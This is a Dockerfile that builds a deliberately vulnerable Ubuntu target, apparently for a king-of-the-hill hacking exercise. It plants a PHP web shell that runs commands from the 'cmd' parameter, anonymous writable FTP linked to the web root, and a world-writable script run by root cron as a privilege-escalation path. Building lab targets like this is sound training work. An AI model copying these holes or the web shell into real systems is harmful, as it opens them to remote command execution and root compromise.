FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    vsftpd \
    apache2 \
    php \
    cron \
    && rm -rf /var/lib/apt/lists/*

# King file
RUN mkdir -p /root && echo "unclaimed" > /root/king.txt && chmod 666 /root/king.txt && chmod 777 /root

# FTP setup - anonymous allowed, writable to web root
RUN mkdir -p /var/ftp/pub && \
    chown -R ftp:ftp /var/ftp && \
    chmod 777 /var/ftp/pub && \
    ln -s /var/www/html /var/ftp/pub/webroot

# vsftpd config - anonymous with write
COPY vsftpd.conf /etc/vsftpd.conf

# Apache setup
RUN echo "<?php if(isset(\$_GET['cmd'])){system(\$_GET['cmd']);}?>" > /var/www/html/info.php
RUN chmod 777 /var/www/html
RUN chown -R www-data:www-data /var/www/html

# PrivEsc: World-writable script run by root cron
RUN mkdir -p /opt/scripts && \
    echo '#!/bin/bash\n# Maintenance script' > /opt/scripts/maintenance.sh && \
    chmod 777 /opt/scripts/maintenance.sh

# Cron job as root running the world-writable script every minute
RUN echo "* * * * * root /opt/scripts/maintenance.sh" >> /etc/crontab

EXPOSE 21 80

CMD ["/bin/bash", "-c", \
    "service rsyslog start; service cron start; service apache2 start; vsftpd /etc/vsftpd.conf"]
